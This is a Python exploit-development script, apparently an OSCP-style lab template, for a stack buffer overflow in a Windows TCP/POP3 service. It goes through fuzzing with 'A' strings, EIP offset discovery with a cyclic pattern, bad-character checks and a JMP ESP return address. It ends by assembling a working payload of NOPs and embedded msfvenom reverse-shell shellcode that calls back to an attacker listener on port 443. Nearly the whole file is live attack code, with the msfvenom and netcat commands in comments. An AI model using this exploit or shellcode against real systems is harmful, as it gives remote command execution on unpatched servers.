#!/usr/bin/python3 
# Test the server with the data that crashed it
# Before running these scripts, it could be possible to use SPIKE to identify if the application is vulnerable to a BoF
# To do so, create the spike scripts to be used with the  generic_tcp_send 
# generic_tcp_send [host] [port] [spike_script] [SKIPVAR] [SKIPSTR]
# check basic.spk or 0Help.spk to see how it works or https://shahrukhathar.info/an-introduction-to-fuzzing-using-fuzzers-spike-to-find-vulnerabilities/
# In case you need to convert from string to bytes use: bytes(test_string, 'utf-8')
# Inverse way: myvar.decode("utf-8")
import socket
import time 
import sys
import struct

#Function to send a message for a previously created socket
def send_msg(s, msg):
    s.send(msg) 

# Creates a connection to the host and port defined globally
def make_con():
    try:
        print("Creating the socket")
        # Create the socket and establish the connection to the server
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print("Establishing the connection")
        # Both parenthesis are required
        s.connect((host, port)) 
        return s
    except Exception as err:
        print ("Error while creating  socket: ")
        print (str(err))
        sys.exit() 

#Fnction to send a payload. It is used by all
def send_payload(payload):
    try:
        s = make_con()
        print("Sending the payload to ", host,":",port)
        s.send(payload) 
        print("Receiving the data")
        s.close() 
    except Exception as err:
        print ("Send payload crashed: ")
        print (str(err))
        sys.exit() 

# Function created to send POP3 messages 
def send_pop(payload):
    try:
        s = make_con()
        data = s.recv(1024)
        print("Answer received: ",data)
        s.send(b"USER test\r\n") 
        data = s.recv(1024)
        print("Received: ", data)
        s.send(b"PASS "+payload) 
        print("Received: ",data)
        s.close() 
    except Exception as err:
        print ("Send pop crashed: ")
        print (str(err))
        sys.exit() 


def send_payload_and_read(payload):
    try:
        s = make_con()
        s.send(payload) 
        print("Receiving the data...")
        data = s.recv(100)
        print(data)
    except Exception as err:
        print ("Send and read crashed: ")
        print (str(err))
        sys.exit() 

#Save the payload to a file
def save_payload(payload, filename):
    try:
        #Payload can be saved to a file in case it is required:
        with open(filename, 'wb') as f:
            f.write(payload)
            f.close()
    except Exception as err:
        print ("Problem saving file ",filename)
        print (str(err))


#Test 1 to fuzz a connection
def fuzz(command, size, gap, max=100000):
    #Initial size to start looking where the server dies 
    #size = 100
    # 1. Finding the approximated size that cause the overflow
    # This is the initial part to identify how many chars can cause an overflow
    # This part can be used if SPIKE was not used to identify if the application crashes
    # If the EIP in the server contains 41414141 (AAAA) this means it is possible to be manipulated
    while (True):
        print ("\nFuzzing system with %s bytes" % size )
        payload = command + b"A"*size + b"\n" 
        # Replaces this line with the data you want to send to the server after the connection is established
        send_payload_and_read(payload)
        #send_pop(payload)
        time.sleep(1)
        size+=gap

#Test 4 - Check badchars
# Download it from https://github.com/corelan/mona and copy the file into Immunity Debugger\PyCommands
#!mona bytearrays (mmunity)
#ERC --bytearray  and ERC --compare after sending to identify bad characters x32dbg/x64dbg)
def remove_badchars(badchars):
    # 4. Checking for badchars (not accepted by the server)
    # Check the stack after sending the payload
    #badchars=[b'\x0a',b'\x0d']
    allchars = [b'\x01', b'\x02', b'\x03', b'\x04', b'\x05', b'\x06', b'\x07', b'\x08', b'\x09', b'\x0a', b'\x0b', b'\x0c', b'\x0d', b'\x0e', b'\x0f', b'\x10', b'\x11', b'\x12', b'\x13', b'\x14', b'\x15', b'\x16', b'\x17', b'\x18', b'\x19', b'\x1a', b'\x1b', b'\x1c', b'\x1d', b'\x1e', b'\x1f', b'\x20', b'\x21', b'\x22', b'\x23', b'\x24', b'\x25', b'\x26', b'\x27', b'\x28', b'\x29', b'\x2a', b'\x2b', b'\x2c', b'\x2d', b'\x2e', b'\x2f', b'\x30', b'\x31', b'\x32', b'\x33', b'\x34', b'\x35', b'\x36', b'\x37', b'\x38', b'\x39', b'\x3a', b'\x3b', b'\x3c', b'\x3d', b'\x3e', b'\x3f', b'\x40', b'\x41', b'\x42', b'\x43', b'\x44', b'\x45', b'\x46', b'\x47', b'\x48', b'\x49', b'\x4a', b'\x4b', b'\x4c', b'\x4d', b'\x4e', b'\x4f', b'\x50', b'\x51', b'\x52', b'\x53', b'\x54', b'\x55', b'\x56', b'\x57', b'\x58', b'\x59', b'\x5a', b'\x5b', b'\x5c', b'\x5d', b'\x5e', b'\x5f', b'\x60', b'\x61', b'\x62', b'\x63', b'\x64', b'\x65', b'\x66', b'\x67', b'\x68', b'\x69', b'\x6a', b'\x6b', b'\x6c', b'\x6d', b'\x6e', b'\x6f', b'\x70', b'\x71', b'\x72', b'\x73', b'\x74', b'\x75', b'\x76', b'\x77', b'\x78', b'\x79', b'\x7a', b'\x7b', b'\x7c', b'\x7d', b'\x7e', b'\x7f', b'\x80', b'\x81', b'\x82', b'\x83', b'\x84', b'\x85', b'\x86', b'\x87', b'\x88', b'\x89', b'\x8a', b'\x8b', b'\x8c', b'\x8d', b'\x8e', b'\x8f', b'\x90', b'\x91', b'\x92', b'\x93', b'\x94', b'\x95', b'\x96', b'\x97', b'\x98', b'\x99', b'\x9a', b'\x9b', b'\x9c', b'\x9d', b'\x9e', b'\x9f', b'\xa0', b'\xa1', b'\xa2', b'\xa3', b'\xa4', b'\xa5', b'\xa6', b'\xa7', b'\xa8', b'\xa9', b'\xaa', b'\xab', b'\xac', b'\xad', b'\xae', b'\xaf', b'\xb0', b'\xb1', b'\xb2', b'\xb3', b'\xb4', b'\xb5', b'\xb6', b'\xb7', b'\xb8', b'\xb9', b'\xba', b'\xbb', b'\xbc', b'\xbd', b'\xbe', b'\xbf', b'\xc0', b'\xc1', b'\xc2', b'\xc3', b'\xc4', b'\xc5', b'\xc6', b'\xc7', b'\xc8', b'\xc9', b'\xca', b'\xcb', b'\xcc', b'\xcd', b'\xce', b'\xcf', b'\xd0', b'\xd1', b'\xd2', b'\xd3', b'\xd4', b'\xd5', b'\xd6', b'\xd7', b'\xd8', b'\xd9', b'\xda', b'\xdb', b'\xdc', b'\xdd', b'\xde', b'\xdf', b'\xe0', b'\xe1', b'\xe2', b'\xe3', b'\xe4', b'\xe5', b'\xe6', b'\xe7', b'\xe8', b'\xe9', b'\xea', b'\xeb', b'\xec', b'\xed', b'\xee', b'\xef', b'\xf0', b'\xf1', b'\xf2', b'\xf3', b'\xf4', b'\xf5', b'\xf6', b'\xf7', b'\xf8', b'\xf9', b'\xfa', b'\xfb', b'\xfc', b'\xfd', b'\xfe', b'\xff']
    for item in badchars:
        allchars.remove(item)
    goodchars=b"".join(allchars)
    return goodchars

#Test 5 shell exploit
# msfvenom -p windows/shell_reverse_tcp LHOST=[IP KALI] LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00\x0a" #include the badchars
def get_shell_exploit(numnops):
    # Before running this code, we need to run a nc in the kali Linux to get the reverse shell: sudo nc -lnvp 443
    shellcode = (b"\xda\xc3\xb8\x7e\xe5\x93\x6d\xd9\x74\x24\xf4\x5b\x33\xc9\xb1"
    b"\x52\x83\xeb\xfc\x31\x43\x13\x03\x3d\xf6\x71\x98\x3d\x10\xf7"
    b"\x63\xbd\xe1\x98\xea\x58\xd0\x98\x89\x29\x43\x29\xd9\x7f\x68"
    b"\xc2\x8f\x6b\xfb\xa6\x07\x9c\x4c\x0c\x7e\x93\x4d\x3d\x42\xb2"
    b"\xcd\x3c\x97\x14\xef\x8e\xea\x55\x28\xf2\x07\x07\xe1\x78\xb5"
    b"\xb7\x86\x35\x06\x3c\xd4\xd8\x0e\xa1\xad\xdb\x3f\x74\xa5\x85"
    b"\x9f\x77\x6a\xbe\xa9\x6f\x6f\xfb\x60\x04\x5b\x77\x73\xcc\x95"
    b"\x78\xd8\x31\x1a\x8b\x20\x76\x9d\x74\x57\x8e\xdd\x09\x60\x55"
    b"\x9f\xd5\xe5\x4d\x07\x9d\x5e\xa9\xb9\x72\x38\x3a\xb5\x3f\x4e"
    b"\x64\xda\xbe\x83\x1f\xe6\x4b\x22\xcf\x6e\x0f\x01\xcb\x2b\xcb"
    b"\x28\x4a\x96\xba\x55\x8c\x79\x62\xf0\xc7\x94\x77\x89\x8a\xf0"
    b"\xb4\xa0\x34\x01\xd3\xb3\x47\x33\x7c\x68\xcf\x7f\xf5\xb6\x08"
    b"\x7f\x2c\x0e\x86\x7e\xcf\x6f\x8f\x44\x9b\x3f\xa7\x6d\xa4\xab"
    b"\x37\x91\x71\x7b\x67\x3d\x2a\x3c\xd7\xfd\x9a\xd4\x3d\xf2\xc5"
    b"\xc5\x3e\xd8\x6d\x6f\xc5\x8b\x51\xd8\xc4\x28\x3a\x1b\xc6\xaf"
    b"\x01\x92\x20\xc5\x65\xf3\xfb\x72\x1f\x5e\x77\xe2\xe0\x74\xf2"
    b"\x24\x6a\x7b\x03\xea\x9b\xf6\x17\x9b\x6b\x4d\x45\x0a\x73\x7b"
    b"\xe1\xd0\xe6\xe0\xf1\x9f\x1a\xbf\xa6\xc8\xed\xb6\x22\xe5\x54"
    b"\x61\x50\xf4\x01\x4a\xd0\x23\xf2\x55\xd9\xa6\x4e\x72\xc9\x7e"
    b"\x4e\x3e\xbd\x2e\x19\xe8\x6b\x89\xf3\x5a\xc5\x43\xaf\x34\x81"
    b"\x12\x83\x86\xd7\x1a\xce\x70\x37\xaa\xa7\xc4\x48\x03\x20\xc1"
    b"\x31\x79\xd0\x2e\xe8\x39\xe0\x64\xb0\x68\x69\x21\x21\x29\xf4"
    b"\xd2\x9c\x6e\x01\x51\x14\x0f\xf6\x49\x5d\x0a\xb2\xcd\x8e\x66"
    b"\xab\xbb\xb0\xd5\xcc\xe9")

    # nops are just like go to the next memmory address.
    nops = b"\x90"*numnops
    result =nops + shellcode
    return result




# Replace it with the server address
host = "192.168.1.56"
# Replace this with the desired port
#port = 9999
#port = 31337
port=110

# Test 0. Testing the connection. Modify send_payload or create a new method based on it as required
# Initial test to chck the server receives the comm
#payload = b"TRUN /.:/" + "A"*800
payload = b"A"*2000+b"\n"
#send_payload(payload)
#send_pop(payload)
#print("Initial message sent successfully")


#Test 1 - check if the program stops at any buffer size
#command = b"TRUN /.:/"
command=b""
initial_size=1000
gap = 500
max=10000
#fuzz(command, initial_size, gap,max)
# Died with 3500
size = 3500
# Now confirm if this size of payload kill the server (based on the previous result)
payload = b"A"*size+b"\n"
#send_payload(payload)


#Test 2
# 2. Finding the exact offset where the EIP is replaced and other pointers that could be modified
# We need to generate a sequence of "random" chars to identify where it happens
# !mona ????   
# Kali: /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 1024 or 
# msf-pattern_create -l 3500
# In x64dbg command: ERC --pattern c 3500 => it should be 2900
totalsize=2900
pattern = (b"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq2Cq3Cq4Cq5Cq6Cq7Cq8Cq9Cr0Cr1Cr2Cr3Cr4Cr5Cr6Cr7Cr8Cr9Cs0Cs1Cs2Cs3Cs4Cs5Cs6Cs7Cs8Cs9Ct0Ct1Ct2Ct3Ct4Ct5Ct6Ct7Ct8Ct9Cu0Cu1Cu2Cu3Cu4Cu5Cu6Cu7Cu8Cu9Cv0Cv1Cv2Cv3Cv4Cv5Cv6Cv7Cv8Cv9Cw0Cw1Cw2Cw3Cw4Cw5Cw6Cw7Cw8Cw9Cx0Cx1Cx2Cx3Cx4Cx5Cx6Cx7Cx8Cx9Cy0Cy1Cy2Cy3Cy4Cy5Cy6Cy7Cy8Cy9Cz0Cz1Cz2Cz3Cz4Cz5Cz6Cz7Cz8Cz9Da0Da1Da2Da3Da4Da5Da6Da7Da8Da9Db0Db1Db2Db3Db4Db5Db6Db7Db8Db9Dc0Dc1Dc2Dc3Dc4Dc5Dc6Dc7Dc8Dc9Dd0Dd1Dd2Dd3Dd4Dd5Dd6Dd7Dd8Dd9De0De1De2De3De4De5De6De7De8De9Df0Df1Df2Df3Df4Df5Df6Df7Df8Df9Dg0Dg1Dg2Dg3Dg4Dg5Dg6Dg7Dg8Dg9Dh0Dh1Dh2Dh3Dh4Dh5Dh6Dh7Dh8Dh9Di0Di1Di2Di3Di4Di5Di6Di7Di8Di9Dj0Dj1Dj2Dj3Dj4Dj5Dj6Dj7Dj8Dj9Dk0Dk1Dk2Dk3Dk4Dk5Dk6Dk7Dk8Dk9Dl0Dl1Dl2Dl3Dl4Dl5Dl6Dl7Dl8Dl9Dm0Dm1Dm2Dm3Dm4Dm5Dm6Dm7Dm8Dm9Dn0Dn1Dn2Dn3Dn4Dn5Dn6Dn7Dn8Dn9Do0Do1Do2Do3Do4Do5Do6Do7Do8Do9Dp0Dp1Dp2Dp3Dp4Dp5Dp6Dp7Dp8Dp9Dq0Dq1Dq2Dq3Dq4Dq5Dq6Dq7Dq8Dq9Dr0Dr1Dr2Dr3Dr4Dr5Dr6Dr7Dr8Dr9Ds0Ds1Ds2Ds3Ds4Ds5Ds6Ds7Ds8Ds9Dt0Dt1Dt2Dt3Dt4Dt5Dt6Dt7Dt8Dt9Du0Du1Du2Du3Du4Du5Du6Du7Du8Du9Dv0Dv1Dv2Dv3Dv4Dv5Dv6Dv7Dv8Dv9Dw0Dw1Dw2Dw3Dw4Dw5Dw6Dw7Dw8Dw9Dx0Dx1Dx2Dx3Dx4Dx5Dx6Dx7Dx8Dx9Dy0Dy1Dy2Dy3Dy4Dy5Dy6Dy7Dy8Dy9Dz0Dz1Dz2Dz3Dz4Dz5Dz6Dz7Dz8Dz9Ea0Ea1Ea2Ea3Ea4Ea5Ea6Ea7Ea8Ea9Eb0Eb1Eb2Eb3Eb4Eb5Eb6Eb7Eb8Eb9Ec0Ec1Ec2Ec3Ec4Ec5Ec6Ec7Ec8Ec9Ed0Ed1Ed2Ed3Ed4Ed5Ed6Ed7Ed8Ed9Ee0Ee1Ee2Ee3Ee4Ee5Ee6Ee7Ee8Ee9Ef0Ef1Ef2Ef3Ef4Ef5Ef6Ef7Ef8Ef9Eg0Eg1Eg2Eg3Eg4Eg5Eg6Eg7Eg8Eg9Eh0Eh1Eh2Eh3Eh4Eh5Eh6Eh7Eh8Eh9Ei0Ei1Ei2Ei3Ei4Ei5Ei6Ei7Ei8Ei9Ej0Ej1Ej2Ej3Ej4Ej5Ej6Ej7Ej8Ej9Ek0Ek1Ek2Ek3Ek4Ek5Ek6Ek7Ek8Ek9El0El1El2El3El4El5El6El7El8El9Em0Em1Em2Em3Em4Em5Em") 
payload= command + pattern + b"\n"
#send_pop(payload)     #After calling the EBP was 69443769 position 2602, EIP: 39694438 position 2606, SP points to the addres that contains 44306A44  Dj0D position 2610
#send_payload(payload)
# After running this part, all the pointers, especially the EIP should be checked to see what we can control. 
# To identify the offset:
# !mona.py findmsp   => will return offset for EIP and ESP and its length (to understand if the payload has enough space to inject the shellcode)
# /opt/metasploit-framework/embedded/bin/ruby /opt/metasploit-framework/embedded/framework/tools/exploit/pattern_offset.rb -l 5000 -q 386F4337
# msf-pattern_offset -l 5000 -q XXXXXX
# In x64dbg command: ERC --pattern o [value_in_ascii]  to get the exact offset 
# To get the ascii value, I had to enter it as "\x01\x02..." (address obtained) using python3 cmd line to get the ascii or in right click, modify in x64dbg to get the ASCII representation


#Test Test 3 Confirm control over some registers
# Once the offset is identified include here the size obtained from the pattern offset 
# Check it is working by running this part and validating EIP becomes CCCC (43434343)
size = 2602   #Value identified in the previous step EBP 2602 EIP 2606 ESP 2610
# Z to identify if it is little indian. 
textpattern = b"A"*(size-1)+b"Z"
# Here the value we want to assign to the registers we want to validate
ebp = b"BBBB"
eip = b"CCCC"   
espcontentsize = totalsize-len(command)-len(textpattern)-len(ebp)-len(eip)  #2900-2602-4-4=290 
espcontent = b"DDDD"+b"E"*(espcontentsize-4)
# Organise the payload according to the observed values
payload = command+textpattern+ebp+eip+espcontent+b"\n"
#send_payload(payload)
#send_pop(payload)
# After sending the message it was observed the EIP has EKIM as value due to the little indian notation


#Test 4 check_badchars
# This part is used to identify if the server accepts all the values or if there are any "badchar" to avoid its use
# !mona config -set workingfolder c:\temp\  #creates a folder with the name of the debugged program
# !mona bytearray   #store it in 2 files: bytearray.bin and .txt
# After running the program, this will validate bad chars:
# !mona compare -f c:\temp\bytearray.bin -a [address where the byte start] => Mona tell us the badchar identified
# !mona bytearray -cpb '\x00'  => removes the x00 from the array in the file
# Customise the badchars inside the check_badchars(bef,aft) function
# we should build the payload based on the previous values + badchars
badchars = [b'\x00',b'\x0a']
goodchars = remove_badchars(badchars)
espsize = 351   #Normal size of the shell we want to inject
espcontent = goodchars + b"E"*(espsize-len(goodchars))
payload = command + textpattern + ebp + eip + espcontent+b"\n"
#charsafter = b"B"*(1024-146-4-len(badchars))+b"\n"
#I will check if 351 (size for the shellcode)  is possible
#payload = command+textpattern+eip+esp+b"B"*(size-len(command)-len(textpattern)-len(eip)-len(esp))+b"\n"
#print("Sending new payload T4")
#send_pop(payload)   #Identified badchars \x0a y \x0d and size fits to have the shell in the ESP space we have
#send_payload(payload)


#Test 5 shell exploit 
# We have: EIP control, goodchars, where to left the shell (351 bytes)
# We need: command to run and address where it can be found
# In kali the opcode can be obtained with msf-nasm_shell
#       >JMP ESP  => FFE4
# Look for JMP ESP ("\xff\xe4") in the insecure modules 
# !mona modules # to identify insecure modules ASLR false. It also cannot contain any bad characters in its base range.
# !mona find -s "\xff\xe4" -m "modulename.dll"   # To identify the address with JMP ESP. It should not contain badchars. Could be JMP AIX, CALL EBP or any other depending where the shellcode is located
# In x64dbg use the command ERC --ModuleInfo  and then go to symbols (alt+e), select any of the dll or exe files by double clicking it. Then ctrl+f to search the required instruction jmp esp
# Pick an address that does not contain identified badchars 

    # We need to find an address where the wanted op (i.e. JMP ESP) can be found to direct the EIP to there
    # In x64dbg 
    # Look for JMP ESP ("\xff\xe4") in the insecure modules identified ("essfunc.dll" in this case)


# msfvenom -p windows/shell_reverse_tcp LHOST=[IP KALI] LPORT=443 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00"
# copy the shell in the method shell_exploit method
# Run nc to get the reverse shell: sudo nc -lnvp 443

#Address we want to point in little indian (inverse order) 0x625011af is now:
#eip = b"\xaf\x11\x50\x62"
eip = struct.pack('<L', 0x5F4A358F)

# nops are just like go to the next memmory address
numnops = 16
charsbefore = command+textpattern+ebp+eip
charsafter = b"B"*100+b"\n"
shellcode = get_shell_exploit(numnops)
print ("Preparing the string with the reverse shell")
payload = charsbefore+shellcode+b"B"*(totalsize-len(charsbefore)-len(shellcode))+b"\n"
#print("Sending the payload")
#send_pop(payload)   
#send_payload(payload)

